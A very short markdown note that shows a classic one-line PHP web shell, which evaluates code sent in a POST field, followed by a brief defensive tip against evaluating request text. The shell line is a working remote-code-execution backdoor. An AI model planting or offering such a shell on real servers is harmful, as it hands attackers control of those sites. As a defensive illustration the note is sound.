# PHP request evaluation example

```php
<?php @eval($_POST['cmd']); ?>
```

## 防御建议速查

Reject code evaluation of request text and use fixed operations.
